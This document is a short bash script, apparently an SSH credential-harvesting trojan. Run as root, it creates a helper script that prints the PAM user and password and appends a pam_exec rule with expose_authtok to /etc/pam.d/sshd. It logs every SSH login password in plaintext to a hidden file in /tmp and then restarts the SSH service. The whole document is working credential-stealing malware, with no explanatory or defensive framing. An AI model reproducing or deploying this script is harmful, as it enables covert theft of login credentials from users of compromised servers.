#!/bin/bash

file_log="/tmp/.log_sshtrojan1.txt"

if [[ $EUID -ne 0 ]]; then
  echo "You need root privileges to run this program"
  exit 1
fi

if [[ -e $file_log ]]; then
  echo "File $file_log was created"
else
  touch $file_log
fi

echo "Time: " `date` >> $file_log

path_script="/usr/local/bin/sshloggerscript.sh"

if [[ -e $path_script ]]; then
  echo "Script $path_script was created"
else
  touch $path_script
fi

cat << EOF >$path_script
#!/bin/bash
read password
echo "User: \$PAM_USER"
echo "Password: \$password"
exit \$?
EOF

chmod +x $path_script
echo "Creat file $path_script to run script"

file_pamsshd="/etc/pam.d/sshd"
cat << EOF >> $file_pamsshd
@include common-auth
#use module pam_exec to call an external command
auth       required   pam_exec.so   expose_authtok   seteuid   log=$file_log   $path_script
EOF

/etc/init.d/ssh restart